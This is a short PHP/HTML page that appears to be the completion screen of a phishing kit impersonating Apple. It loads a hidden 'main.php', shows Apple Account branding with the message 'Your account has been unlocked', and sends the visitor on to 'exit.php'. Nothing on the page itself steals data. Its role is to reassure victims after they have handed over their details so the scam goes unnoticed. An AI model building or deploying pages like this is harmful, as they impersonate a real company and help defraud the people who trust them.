<?php require 'main.php'; ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="res/css/done.css">
  <title>login</title>
</head>

<body>
  <header>
    <div class="logo"><img src="res/img/logo.png"></div>
    <div class="right"><img src="res/img/icon.png"></div>
  </header>
  <main>
    <div class="continer">
      <div class="apple">Apple Account</div>
      <div class="title">
        <span>Your account has been unlocked.</span> <img src="res/img/done.png" alt="sojec">
      </div>
    
        <div class="tile">Sign in to your Apple Account page now to review your account information..</div>
        
        <div class="btn">
          <div class="call"><button onclick="mov()">Go to your account</button></div>
        </div>
    </div>
  </main>


  <script>
    function mov() {
      window.location = "exit.php"; }
  </script>

</body>

</html>